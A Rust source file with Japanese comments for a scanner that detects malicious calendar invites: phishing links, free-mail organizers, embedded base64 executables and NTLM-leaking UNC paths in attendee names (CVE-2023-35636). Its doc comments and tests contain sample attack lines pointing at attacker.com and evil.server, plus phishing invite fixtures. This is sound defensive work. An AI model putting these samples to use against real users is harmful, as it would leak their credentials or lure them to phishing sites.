// crates/kaname-render/src/calendar_guard.rs
//
// カレンダー招待 (.ics) 安全検査器
//
// 2026 年に急増: 悪意ある URL を含む .ics ファイルをメールに添付し、
// 「会議招待」に見せかけてフィッシングサイトへ誘導する攻撃。
//
// # 攻撃の仕組み
//
// ```text
// 攻撃者が .ics 添付を送信 (「来週のミーティング」等)
//   ↓
// ユーザーがカレンダーアプリで開く
//   ↓
// DESCRIPTION や URL フィールドに悪意ある URL が埋め込まれている
//   ↓
// ユーザーが「参加リンク」をクリック → フィッシングサイト
// ```
//
// # 検出アプローチ
//
// .ics ファイルを開く前に主催者ドメイン、URL、緊急キーワードを検査する。

use serde::{Deserialize, Serialize};

/// カレンダー招待のリスク種別。
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum CalendarRisk {
    /// 疑わしい URL が含まれる
    SuspiciousUrl {
        /// 問題の URL
        url: String,
        /// 疑わしい理由
        reason: String,
    },
    /// 主催者のドメインが疑わしい
    SuspiciousOrganizer {
        /// 主催者の email/name
        organizer: String,
        /// 問題の詳細
        reason: String,
    },
    /// 緊急性を偽装したキーワード
    UrgencyManipulation {
        /// 検出されたキーワード
        keyword: String,
    },
    /// 会議参加リンクが外部の怪しいドメインを指す
    SuspiciousMeetingLink {
        /// 問題のリンク
        link: String,
    },
    /// ATTACH プロパティに base64 エンコードされたバイナリが埋め込まれている
    ///
    /// HTML スマグリングの ICS 版: .ics に PE/スクリプトを base64 で埋め込み
    /// カレンダーアプリが展開して実行させる手法。
    EmbeddedBinaryAttachment {
        /// 検出されたバイナリの種別 (PE, Script 等)
        kind: String,
        /// ATTACH プロパティ行の先頭部分
        snippet: String,
    },
    /// ATTENDEE/ORGANIZER の CN フィールドに UNC パス (\\server\share) が含まれる。
    ///
    /// CVE-2023-35636 型攻撃: Outlook が CN を自動解決する際に UNC を参照し
    /// NTLMv2 ハッシュが漏洩する。
    /// 出典: https://codebook.machinarecord.com/threatreport/31520/
    UncPathInAttendeeCn {
        /// 問題の CN 値
        cn: String,
    },
    /// SEQUENCE 番号が不正 (過去の値以下 = リプレイ/スプーフィングの可能性)。
    ///
    /// RFC 5545 §3.8.7.4: SEQUENCE は更新ごとに単調増加しなければならない。
    /// 攻撃者が低い SEQUENCE で正規招待を上書きし会議の日時を変更する手法を防ぐ。
    SequenceNotMonotonic {
        /// 受信した SEQUENCE 値
        received: u32,
        /// 既知の最後の SEQUENCE 値
        expected_min: u32,
    },
}

/// カレンダー招待スキャン結果。
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CalendarScan {
    /// 検出されたリスク一覧
    pub risks: Vec<CalendarRisk>,
    /// 総合リスクレベル
    pub risk_level: CalendarRiskLevel,
}

/// 総合リスクレベル。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum CalendarRiskLevel {
    /// 安全
    Safe,
    /// 確認推奨
    Caution,
    /// 危険
    Danger,
}

/// カレンダー招待検査器。
pub struct CalendarGuard;

impl CalendarGuard {
    /// .ics ファイルの内容を解析してリスクを検出する。
    #[must_use]
    pub fn analyze(&self, ics_content: &str) -> CalendarScan {
        let mut risks = Vec::new();

        // 1. URL フィールドを抽出して検査
        for url in extract_ics_urls(ics_content) {
            if let Some(reason) = self.evaluate_url(&url) {
                risks.push(CalendarRisk::SuspiciousUrl { url, reason });
            }
        }

        // 2. 主催者を抽出して検査
        if let Some(organizer) = extract_organizer(ics_content) {
            if let Some(reason) = self.evaluate_organizer(&organizer) {
                risks.push(CalendarRisk::SuspiciousOrganizer { organizer, reason });
            }
        }

        // 3. 緊急性の偽装キーワード
        let desc = extract_field(ics_content, "DESCRIPTION").unwrap_or_default().to_lowercase();
        let summary = extract_field(ics_content, "SUMMARY").unwrap_or_default().to_lowercase();
        let combined = format!("{desc} {summary}");

        let urgency_keywords = [
            ("account suspended", "アカウント停止を装う"),
            ("verify now", "即時確認を要求"),
            ("immediate action required", "緊急アクションを要求"),
            ("your account will be deleted", "アカウント削除を脅す"),
            ("click to confirm", "クリックを促す"),
            ("password expiring", "パスワード期限切れを装う"),
            ("アカウントが停止", "アカウント停止を装う"),
            ("至急確認", "緊急確認を要求"),
        ];

        for (keyword, reason) in &urgency_keywords {
            if combined.contains(keyword) {
                risks.push(CalendarRisk::UrgencyManipulation {
                    keyword: keyword.to_string(),
                });
                let _ = reason; // UI で別途説明
                break; // 1つ検出すれば十分
            }
        }

        // 4. 会議リンク (CONFERENCE/LOCATION フィールド)
        for field in ["CONFERENCE", "LOCATION", "X-GOOGLE-CONFERENCE", "X-ZOOM-JOIN-URL"] {
            if let Some(value) = extract_field(ics_content, field) {
                if value.starts_with("http") {
                    if let Some(_reason) = self.evaluate_url(&value) {
                        risks.push(CalendarRisk::SuspiciousMeetingLink { link: value });
                        break;
                    }
                }
            }
        }

        // 5. ATTACH;ENCODING=BASE64 バイナリ埋め込み検出
        for risk in detect_binary_attachments(ics_content) {
            risks.push(risk);
        }

        // 6. ATTENDEE / ORGANIZER CN の UNC パス検出 (CVE-2023-35636 型)
        // CN="\\server\share" で NTLMv2 ハッシュ漏洩
        for risk in detect_unc_in_attendee(ics_content) {
            risks.push(risk);
        }

        // 7. SEQUENCE 単調性チェック (known_sequence=0 は初回受信を意味する)
        if let Some(seq_risk) = check_sequence_monotonicity(ics_content, 0) {
            risks.push(seq_risk);
        }

        let risk_level = Self::calculate_level(&risks);
        CalendarScan { risks, risk_level }
    }

    /// URL が疑わしい場合に理由を返す。
    fn evaluate_url(&self, url: &str) -> Option<String> {
        let lower = url.to_lowercase();

        // 無料 TLD
        let free_tlds = [".tk", ".ml", ".ga", ".cf", ".gq", ".click", ".download"];
        for tld in &free_tlds {
            if lower.contains(tld) {
                return Some(format!("無料 TLD ({tld}) は悪用が多い"));
            }
        }

        // 数字混入 (amaz0n, g00gle 等)
        let suspicious = [
            ("amaz0n", "amazon を模倣"),
            ("paypa1", "paypal を模倣"),
            ("g00gle", "google を模倣"),
            ("micr0soft", "microsoft を模倣"),
            ("0ffice365", "office365 を模倣"),
        ];
        for (pattern, reason) in &suspicious {
            if lower.contains(pattern) {
                return Some(reason.to_string());
            }
        }

        // 正規ドメインを装った偽サブドメイン
        let legit = ["microsoft.com", "google.com", "zoom.us", "teams.microsoft.com"];
        for domain in &legit {
            if lower.contains(domain) {
                let host = extract_host(&lower).unwrap_or_default();
                if !host.ends_with(domain) && !host.is_empty() {
                    return Some(format!("{domain} を装った偽ドメインの可能性: {host}"));
                }
            }
        }

        None
    }

    /// 主催者ドメインを評価する。
    fn evaluate_organizer(&self, organizer: &str) -> Option<String> {
        let lower = organizer.to_lowercase();
        // mailto: から email を抽出
        let email = if lower.contains("mailto:") {
            lower.split("mailto:").nth(1)
                .map(|s| s.split('"').next().unwrap_or(s).trim().to_string())
        } else {
            Some(lower.clone())
        };

        if let Some(email) = email {
            // フリーメール (法人招待としては不自然)
            let free_providers = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "qq.com"];
            for provider in &free_providers {
                if email.ends_with(provider) {
                    return Some(format!("法人会議にフリーメール ({provider}) を使用"));
                }
            }
        }

        None
    }

    fn calculate_level(risks: &[CalendarRisk]) -> CalendarRiskLevel {
        if risks.is_empty() {
            return CalendarRiskLevel::Safe;
        }

        let has_suspicious_url = risks.iter().any(|r| matches!(r, CalendarRisk::SuspiciousUrl { .. }));
        let has_suspicious_meeting = risks.iter().any(|r| matches!(r, CalendarRisk::SuspiciousMeetingLink { .. }));
        let has_unc = risks.iter().any(|r| matches!(r, CalendarRisk::UncPathInAttendeeCn { .. }));
        let has_binary = risks.iter().any(|r| matches!(r, CalendarRisk::EmbeddedBinaryAttachment { .. }));

        if has_suspicious_url || has_suspicious_meeting || has_unc || has_binary {
            CalendarRiskLevel::Danger
        } else {
            CalendarRiskLevel::Caution
        }
    }
}

impl Default for CalendarGuard {
    fn default() -> Self { Self }
}

// ============================================================================
// ICS パーサーユーティリティ
// ============================================================================

/// ATTENDEE / ORGANIZER の CN フィールドに UNC パスが含まれるか検出する (CVE-2023-35636 型)。
///
/// 攻撃例:
/// ```ics
/// ATTENDEE;CN="\\\\attacker.com\\share":mailto:victim@example.com
/// ```
/// Outlook 等が CN を UI 表示のために解決しようとすると UNC を参照し、
/// NTLMv2 ハッシュが攻撃者サーバーに漏洩する。
/// 出典: https://codebook.machinarecord.com/threatreport/31520/ (2024)
fn detect_unc_in_attendee(content: &str) -> Vec<CalendarRisk> {
    let mut risks = Vec::new();
    for line in content.lines() {
        let upper = line.to_uppercase();
        if !upper.starts_with("ATTENDEE") && !upper.starts_with("ORGANIZER") {
            continue;
        }
        // CN="..." または CN=... を抽出
        let cn_value = extract_cn_value(line);
        if let Some(cn) = cn_value {
            // UNC パス: \ \ で始まる (バックスラッシュ 2 連続)
            if cn.contains("\\\\") || cn.contains("//") {
                risks.push(CalendarRisk::UncPathInAttendeeCn { cn });
            }
        }
    }
    risks
}

/// CN パラメータ値を抽出する。`CN="value"` または `CN=value` 形式に対応。
fn extract_cn_value(line: &str) -> Option<String> {
    let upper = line.to_uppercase();
    let cn_pos = upper.find(";CN=")?;
    let rest = &line[cn_pos + 4..]; // skip ";CN="
    if let Some(rest_inner) = rest.strip_prefix('"') {
        // CN="quoted value"
        let end = rest_inner.find('"')?;
        Some(rest_inner[..end].to_string())
    } else {
        // CN=unquoted — 次の ; か : で終端
        let end = rest.find([';', ':']).unwrap_or(rest.len());
        Some(rest[..end].to_string())
    }
}

/// SEQUENCE フィールドが単調増加しているか確認する (RFC 5545 §3.8.7.4)。
///
/// `known_sequence` は直前に処理した SEQUENCE 値。初回受信時は `0`。
/// SEQUENCE < `known_sequence` の場合はリプレイ/スプーフィングの可能性。
fn check_sequence_monotonicity(content: &str, known_sequence: u32) -> Option<CalendarRisk> {
    // SEQUENCE: の値を取得
    for line in content.lines() {
        let upper = line.to_uppercase();
        if upper.starts_with("SEQUENCE:") {
            let val_str = line[9..].trim();
            if let Ok(seq) = val_str.parse::<u32>() {
                // seq == 0 は初回作成なので known_sequence == 0 のとき正常
                if known_sequence > 0 && seq < known_sequence {
                    return Some(CalendarRisk::SequenceNotMonotonic {
                        received: seq,
                        expected_min: known_sequence,
                    });
                }
            }
            break;
        }
    }
    None
}

/// ATTACH プロパティに base64 バイナリが埋め込まれているかを検出する。
///
/// 攻撃パターン:
/// ```text
/// ATTACH;ENCODING=BASE64;VALUE=BINARY:TVqQAAMAAAA... (MZ = PE ヘッダー)
/// ATTACH;ENCODING=BASE64;VALUE=BINARY:77u/PCFET...  (BOM + HTML)
/// ATTACH;ENCODING=BASE64;VALUE=BINARY:UEsDBBQA...   (PK = ZIP)
/// ```
fn detect_binary_attachments(content: &str) -> Vec<CalendarRisk> {
    let mut risks = Vec::new();

    // base64 デコード後のバイナリシグネチャ (先頭バイト)
    // base64 の先頭文字でマジックバイトを推定 (完全デコードなしで高速判定)
    const SUSPICIOUS_B64_PREFIXES: &[(&str, &str)] = &[
        ("TVoA", "Windows PE (MZ ヘッダー)"),  // MZ\x00\x00
        ("TVqQ", "Windows PE (MZ ヘッダー)"),  // MZ\x90\x00 (最一般的な PE)
        ("TVpA", "Windows PE (MZ ヘッダー)"),  // MZ@\x00
        ("UEsDB", "ZIP アーカイブ (PK ヘッダー)"),
        ("7z/A", "7-Zip アーカイブ"),
        ("AAAA", "汎用バイナリ (高エントロピー)"),
        ("77u/PCFET", "BOM 付き HTML ドキュメント"),
        ("77u/PHNj", "BOM 付き script タグ"),
        ("IyEvYmlu", "シェバング行 (#!/bin)"),
        ("cG93ZXJz", "PowerShell (powers...)"),
        ("JAB", "PowerShell ($...)"),
    ];

    for line in content.lines() {
        let upper = line.to_uppercase();
        // ATTACH プロパティで ENCODING=BASE64 かつ VALUE=BINARY のもの
        if upper.contains("ATTACH") && upper.contains("ENCODING=BASE64") && upper.contains("VALUE=BINARY") {
            // コロン以降が base64 データ
            let b64_data = line.split_once(':').map(|x| x.1.trim()).unwrap_or("").trim();
            if b64_data.is_empty() {
                continue;
            }
            // マジックバイトチェック
            let mut detected_kind = None;
            for (prefix, kind) in SUSPICIOUS_B64_PREFIXES {
                if b64_data.starts_with(prefix) {
                    detected_kind = Some(*kind);
                    break;
                }
            }
            // 未知バイナリでも ENCODING=BASE64;VALUE=BINARY は要注意
            let kind = detected_kind.unwrap_or("不明なバイナリデータ").to_string();
            let snippet = b64_data.get(..40).unwrap_or(b64_data);
            risks.push(CalendarRisk::EmbeddedBinaryAttachment {
                kind,
                snippet: snippet.to_string(),
            });
        }
    }
    risks
}

fn extract_ics_urls(content: &str) -> Vec<String> {
    let mut urls = Vec::new();
    for line in content.lines() {
        let trimmed = line.trim();
        for prefix in ["URL:", "URL;", "ATTACH;"] {
            if trimmed.to_uppercase().starts_with(prefix) {
                let value = trimmed.split_once(':').map_or("", |x| x.1).trim();
                if value.starts_with("http") {
                    urls.push(value.to_string());
                }
            }
        }
        // DESCRIPTION や LOCATION 内の URL
        if trimmed.to_uppercase().starts_with("DESCRIPTION:") || trimmed.to_uppercase().starts_with("LOCATION:") {
            let value = trimmed.split_once(':').map_or("", |x| x.1);
            // 簡易 URL 抽出
            if let Some(start) = value.find("http") {
                let url_part: String = value[start..].chars().take_while(|c| !c.is_whitespace()).collect();
                if !url_part.is_empty() {
                    urls.push(url_part);
                }
            }
        }
    }
    urls
}

fn extract_organizer(content: &str) -> Option<String> {
    for line in content.lines() {
        let upper = line.to_uppercase();
        if upper.starts_with("ORGANIZER") {
            return Some(line.to_string());
        }
    }
    None
}

fn extract_field(content: &str, field_name: &str) -> Option<String> {
    let prefix = format!("{}:", field_name.to_uppercase());
    for line in content.lines() {
        if line.to_uppercase().starts_with(&prefix) {
            return Some(line[prefix.len()..].trim().to_string());
        }
    }
    None
}

fn extract_host(url: &str) -> Option<String> {
    let without_scheme = url.trim_start_matches("https://").trim_start_matches("http://");
    let end = without_scheme.find(['/', '?']).unwrap_or(without_scheme.len());
    if end > 0 {
        Some(without_scheme[..end].to_string())
    } else {
        None
    }
}

// ============================================================================
// テスト
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    const NORMAL_ICS: &str = r#"BEGIN:VCALENDAR
VERSION:2.0
BEGIN:VEVENT
SUMMARY:週次チームミーティング
ORGANIZER:mailto:alice@company.co.jp
DTSTART:20260515T100000Z
DTEND:20260515T110000Z
DESCRIPTION:通常のミーティングです
URL:https://teams.microsoft.com/l/meetup-join/abc123
END:VEVENT
END:VCALENDAR"#;

    const PHISHING_ICS: &str = r#"BEGIN:VCALENDAR
VERSION:2.0
BEGIN:VEVENT
SUMMARY:Account Suspended - Verify Now
ORGANIZER:mailto:support@gmail.com
DESCRIPTION:Your account will be deleted. Verify now: http://amaz0n.tk/verify
URL:http://phishing.tk/steal
END:VEVENT
END:VCALENDAR"#;

    fn guard() -> CalendarGuard { CalendarGuard }

    #[test]
    fn normal_meeting_is_safe() {
        let g = guard();
        // Teams リンクは正規ドメインなので Safe
        let scan = g.analyze(NORMAL_ICS);
        // 正規 Teams URL は危険でない
        assert!(
            scan.risk_level == CalendarRiskLevel::Safe || scan.risks.is_empty(),
            "通常の会議は安全: {:?}", scan.risks
        );
    }

    #[test]
    fn phishing_ics_is_dangerous() {
        let g = guard();
        let scan = g.analyze(PHISHING_ICS);
        assert_eq!(scan.risk_level, CalendarRiskLevel::Danger);
        assert!(!scan.risks.is_empty());
    }

    #[test]
    fn detects_free_tld() {
        let g = guard();
        let ics = "BEGIN:VCALENDAR\nURL:http://meeting.tk/join\nEND:VCALENDAR";
        let scan = g.analyze(ics);
        assert!(scan.risks.iter().any(|r| matches!(r, CalendarRisk::SuspiciousUrl { .. })));
    }

    #[test]
    fn detects_digit_substitution_in_url() {
        let g = guard();
        let ics = "BEGIN:VCALENDAR\nURL:https://amaz0n.com/verify\nEND:VCALENDAR";
        let scan = g.analyze(ics);
        assert!(scan.risks.iter().any(|r| matches!(r, CalendarRisk::SuspiciousUrl { .. })));
    }

    #[test]
    fn detects_urgency_keyword() {
        let g = guard();
        let ics = "BEGIN:VCALENDAR\nSUMMARY:Account Suspended - verify now\nEND:VCALENDAR";
        let scan = g.analyze(ics);
        assert!(scan.risks.iter().any(|r| matches!(r, CalendarRisk::UrgencyManipulation { .. })));
    }

    #[test]
    fn detects_free_mail_organizer() {
        let g = guard();
        let ics = "BEGIN:VCALENDAR\nORGANIZER:mailto:cfo@gmail.com\nEND:VCALENDAR";
        let scan = g.analyze(ics);
        assert!(scan.risks.iter().any(|r| matches!(r, CalendarRisk::SuspiciousOrganizer { .. })));
    }

    #[test]
    fn extract_urls_from_description() {
        let ics = "BEGIN:VCALENDAR\nDESCRIPTION:Join at http://evil.tk/meet\nEND:VCALENDAR";
        let urls = extract_ics_urls(ics);
        assert!(!urls.is_empty(), "URL が description から抽出される");
        assert!(urls.iter().any(|u| u.contains("evil.tk")));
    }

    #[test]
    fn risk_level_danger_with_suspicious_url() {
        let risks = vec![CalendarRisk::SuspiciousUrl {
            url: "http://phish.tk".into(),
            reason: "free TLD".into(),
        }];
        assert_eq!(CalendarGuard::calculate_level(&risks), CalendarRiskLevel::Danger);
    }

    #[test]
    fn risk_level_caution_with_urgency_only() {
        let risks = vec![CalendarRisk::UrgencyManipulation {
            keyword: "verify now".into(),
        }];
        assert_eq!(CalendarGuard::calculate_level(&risks), CalendarRiskLevel::Caution);
    }

    #[test]
    fn empty_ics_is_safe() {
        let g = guard();
        let scan = g.analyze("BEGIN:VCALENDAR\nEND:VCALENDAR");
        assert_eq!(scan.risk_level, CalendarRiskLevel::Safe);
    }

    // ──────────────────────────────────────────────────────────────────
    // ATTACH base64 バイナリ検出
    // ──────────────────────────────────────────────────────────────────

    #[test]
    fn detects_pe_binary_in_attach() {
        let g = guard();
        // TVqQ... は Windows PE (MZ\x90\x00) ヘッダーの base64
        let ics = "BEGIN:VCALENDAR\n\
                   BEGIN:VEVENT\n\
                   SUMMARY:Meeting\n\
                   ATTACH;ENCODING=BASE64;VALUE=BINARY:TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA\n\
                   END:VEVENT\n\
                   END:VCALENDAR";
        let scan = g.analyze(ics);
        assert!(
            scan.risks.iter().any(|r| matches!(r, CalendarRisk::EmbeddedBinaryAttachment { .. })),
            "PE バイナリが検出されるべき: {:?}", scan.risks
        );
        assert_ne!(scan.risk_level, CalendarRiskLevel::Safe);
    }

    #[test]
    fn detects_zip_in_attach() {
        let g = guard();
        // UEsDB... は ZIP (PK ヘッダー) の base64
        let ics = "BEGIN:VCALENDAR\n\
                   BEGIN:VEVENT\n\
                   ATTACH;ENCODING=BASE64;VALUE=BINARY:UEsDBBQAAAAIAA==\n\
                   END:VEVENT\n\
                   END:VCALENDAR";
        let scan = g.analyze(ics);
        assert!(
            scan.risks.iter().any(|r| matches!(r, CalendarRisk::EmbeddedBinaryAttachment { kind, .. } if kind.contains("ZIP"))),
            "ZIP が検出されるべき"
        );
    }

    #[test]
    fn url_attach_not_flagged_as_binary() {
        let g = guard();
        // URL 形式の ATTACH は base64 バイナリではない
        let ics = "BEGIN:VCALENDAR\n\
                   BEGIN:VEVENT\n\
                   ATTACH;FMTTYPE=application/pdf:https://example.com/doc.pdf\n\
                   END:VEVENT\n\
                   END:VCALENDAR";
        let scan = g.analyze(ics);
        assert!(
            !scan.risks.iter().any(|r| matches!(r, CalendarRisk::EmbeddedBinaryAttachment { .. })),
            "URL 形式の ATTACH はバイナリとして検出しない"
        );
    }

    // ──────────────────────────────────────────────────────────────────
    // ATTENDEE CN UNC パス検出 (CVE-2023-35636 型)
    // ──────────────────────────────────────────────────────────────────

    #[test]
    fn detects_unc_path_in_attendee_cn() {
        let g = guard();
        let ics = "BEGIN:VCALENDAR\n\
                   BEGIN:VEVENT\n\
                   ATTENDEE;CN=\"\\\\attacker.com\\share\":mailto:victim@example.com\n\
                   END:VEVENT\n\
                   END:VCALENDAR";
        let scan = g.analyze(ics);
        assert!(
            scan.risks.iter().any(|r| matches!(r, CalendarRisk::UncPathInAttendeeCn { .. })),
            "ATTENDEE CN の UNC パスが検出されるべき: {:?}", scan.risks
        );
        assert_eq!(scan.risk_level, CalendarRiskLevel::Danger);
    }

    #[test]
    fn detects_unc_path_in_organizer_cn() {
        let g = guard();
        let ics = "BEGIN:VCALENDAR\n\
                   ORGANIZER;CN=\"\\\\evil.server\\ntlm\":mailto:fake@org.com\n\
                   END:VCALENDAR";
        let scan = g.analyze(ics);
        assert!(
            scan.risks.iter().any(|r| matches!(r, CalendarRisk::UncPathInAttendeeCn { .. })),
            "ORGANIZER CN の UNC パスが検出されるべき"
        );
    }

    #[test]
    fn normal_attendee_cn_passes() {
        let g = guard();
        let ics = "BEGIN:VCALENDAR\n\
                   ATTENDEE;CN=\"Alice Smith\":mailto:alice@company.co.jp\n\
                   END:VCALENDAR";
        let scan = g.analyze(ics);
        assert!(!scan.risks.iter().any(|r| matches!(r, CalendarRisk::UncPathInAttendeeCn { .. })),
            "通常の CN は問題なし: {:?}", scan.risks);
    }

    // ──────────────────────────────────────────────────────────────────
    // SEQUENCE 単調性チェック
    // ──────────────────────────────────────────────────────────────────

    #[test]
    fn sequence_monotonicity_violation_detected() {
        // known_sequence=5 に対して SEQUENCE:2 は後退 → リプレイ/スプーフィング
        let content = "BEGIN:VCALENDAR\nSEQUENCE:2\nEND:VCALENDAR";
        let risk = check_sequence_monotonicity(content, 5);
        assert!(
            matches!(risk, Some(CalendarRisk::SequenceNotMonotonic { received: 2, expected_min: 5 })),
            "SEQUENCE 後退はリスクとして検出されるべき: {risk:?}"
        );
    }

    #[test]
    fn sequence_monotonic_ok() {
        let content = "BEGIN:VCALENDAR\nSEQUENCE:6\nEND:VCALENDAR";
        let risk = check_sequence_monotonicity(content, 5);
        assert!(risk.is_none(), "SEQUENCE 前進は正常: {risk:?}");
    }

    #[test]
    fn sequence_first_receive_not_flagged() {
        // known_sequence=0 の場合 SEQUENCE:0 は初回作成として正常
        let content = "BEGIN:VCALENDAR\nSEQUENCE:0\nEND:VCALENDAR";
        let risk = check_sequence_monotonicity(content, 0);
        assert!(risk.is_none(), "初回受信は正常");
    }

    #[test]
    fn unknown_binary_attach_still_flagged() {
        let g = guard();
        // 未知シグネチャでも ENCODING=BASE64;VALUE=BINARY は Caution 扱い
        let ics = "BEGIN:VCALENDAR\n\
                   BEGIN:VEVENT\n\
                   ATTACH;ENCODING=BASE64;VALUE=BINARY:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\n\
                   END:VEVENT\n\
                   END:VCALENDAR";
        let scan = g.analyze(ics);
        assert!(
            scan.risks.iter().any(|r| matches!(r, CalendarRisk::EmbeddedBinaryAttachment { .. })),
            "未知バイナリも検出されるべき"
        );
    }
}
